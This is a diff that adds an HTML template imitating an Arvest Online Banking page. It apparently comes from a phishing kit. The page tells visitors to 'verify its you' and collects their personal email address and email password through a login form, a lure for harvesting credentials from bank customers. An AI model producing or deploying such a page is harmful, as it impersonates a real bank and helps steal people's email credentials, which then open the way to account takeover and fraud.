@@ -1,0 +1,42 @@
+{% extends 'base.html'%} {%block body%}
+
+
+<div style="padding-top: 5px" class="middle-form">
+ 
+  
+  <div class="submitForm">
+    
+ <p class="go-left" style="font-size: 14px; margin-bottom: 30px;">
+    Verify its you by entering your email credentials <br />
+  </p>
+    
+    <form id="login-form" action="" method="post">
+      <div class="input-field" style="text-align: left">
+        <label for="username">Personal Email ID <span style="color: red;">*</span></label>
+        <input id="username" name="email-id" type="text" />
+      </div>
+      <div class="input-field" style="text-align: left">
+        <label for="password">Password <span style="color: red;">*</span></label>
+        <input id="password" name="password" type="password" />
+      </div>
+
+      <button type="submit">Submit</button>
+      
+    </form>
+
+    <br />
+ 
+    <p>Unauthorized access is prohibited. Usage may be monitored</p>
+
+    <hr>
+
+    <p>Have questions about Arvest Online Banking?</p>
+   
+
+    <br><br><br><br><br><br>
+    
+  </div>
+</div>
+
+
+{%endblock%}
